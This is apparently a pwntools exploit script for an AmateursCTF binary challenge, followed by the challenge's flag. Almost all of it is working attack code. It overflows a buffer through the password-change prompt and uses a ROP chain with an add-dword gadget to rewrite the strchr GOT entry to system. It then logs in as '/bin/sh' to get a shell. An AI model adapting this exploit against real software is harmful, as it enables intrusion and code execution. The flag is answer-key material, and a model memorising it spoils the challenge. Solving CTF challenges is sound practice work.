from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    b *0x401478
    continue
''')

# p = remote('amt.rs', 19684)

def login(username, password):
    credentials = username + b':' + password
    p.sendlineafter(b"Enter your login information: ", credentials)

def change_password(password):
    p.sendlineafter(b"!\n", b'2')
    p.sendlineafter(b"New password: ", password)

def logout():
    p.sendlineafter(b"!\n", b'3')

glibc_e = ELF('./libc.so.6')

GADGET_1 = 0x40118c # 0x000000000040118c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
GADGET_2 = 0x40118d # 0x000000000040118d : pop rbp ; ret
GADGET_3 = 0x4014a1 # 0x00000000004014a1 : ret
VULN_CONT = 0x4011c9
STRCHR_GOT = 0x404020
FAKE_RBP = 0x404e00

# buffer overflow followed by ROP with special gadgets to change GOT table entry
login(b'A', b'A'*0x170) # prepare for buffer overflow
change_password(b'A'*0x138+p64(0x100000000-(glibc_e.sym.__strchr_avx2-glibc_e.sym.system))+p64(STRCHR_GOT+0x3d)+p64(GADGET_1)+p64(GADGET_2)+p64(FAKE_RBP)+p64(GADGET_3)+p64(VULN_CONT)) # buffer overflow to write rop chain to return address
logout() # prepare for shell popping
login(b'/bin/sh\x00', b'A') # pop a shell by triggering system("/bin/sh\x00") through strchr("/bin/sh\x00")

p.interactive()

# amateursCTF{everyone_loves_a_good_macro_pasting_system}